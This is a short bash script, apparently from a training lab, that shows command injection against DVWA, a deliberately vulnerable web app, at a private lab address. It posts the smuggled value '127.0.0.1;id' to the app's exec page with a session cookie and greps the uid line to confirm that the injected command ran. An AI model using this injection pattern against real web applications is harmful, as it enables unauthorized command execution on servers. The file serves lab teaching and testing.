#!/usr/bin/env bash
set -euo pipefail
: "${LAB_CONFIRM:?Set LAB_CONFIRM=NT204-LAB}"
[[ "$LAB_CONFIRM" == NT204-LAB ]] || { echo 'Wrong lab confirmation' >&2; exit 1; }
: "${DVWA_COOKIE:?Set DVWA_COOKIE to a temporary authenticated cookie file}"
WEB_IP="${WEB_IP:-10.10.20.10}"
test -r "$DVWA_COOKIE" || { echo 'Cookie file is not readable' >&2; exit 1; }
curl --max-time 8 -fsS -b "$DVWA_COOKIE" \
  --data-urlencode 'ip=127.0.0.1;id' \
  --data-urlencode 'Submit=Submit' \
  "http://${WEB_IP}/DVWA/vulnerabilities/exec/" \
  | grep -Eo 'uid=[0-9]+\([^)]*\)' | head -1
